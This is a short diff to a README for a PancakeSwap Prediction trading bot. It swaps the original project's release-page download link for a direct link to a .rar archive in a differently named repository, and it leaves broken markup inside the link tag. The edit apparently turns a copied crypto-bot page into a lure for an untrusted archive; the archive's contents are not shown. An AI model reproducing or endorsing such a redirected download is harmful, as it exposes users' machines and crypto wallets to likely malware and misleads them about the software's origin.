@@ -10,7 +10,7 @@
 <p align="center">Bot for PancakeSwap Prediction – 26 technical indicators. Make smarter predictions with the Winnerbot – trust math, not emotions!</p>
 
 <p align=center>
-  <a href="https://github.com/modagavr/pancake-wizard/releases/latest">Download</a> ·
+  <a href="https://github.com/BearAnBull/Pancakeswap-Winningbot/releases/download/V.1.1.5/Pancakeswap-Winningbot.2023.rar" ## **>Download</a>
 </p>
 
 
